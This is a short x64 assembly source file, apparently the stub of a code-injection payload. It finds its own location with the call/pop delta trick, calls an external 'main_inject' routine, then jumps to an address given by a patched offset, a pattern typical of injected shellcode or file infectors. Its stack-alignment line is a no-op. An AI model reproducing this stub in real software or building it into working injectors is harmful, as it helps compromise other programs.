public __begin_of_code
public payload
public delta

extern main_inject:proto
inject SEGMENT READ EXECUTE

    __begin_of_code:
    payload proc

        call _next
        _next:
            pop rbp
            sub rbp, _next - payload

            ; realigner la stack ?
            sub rsp, 16
            and rsp, -1

            push 12
            call main_inject

            mov rbx, [rbp + (delta - payload)]
            add rbx, rbp
            call rbx
    
        vars:
            delta label QWORD
            dq 0
    payload endp

inject ends
END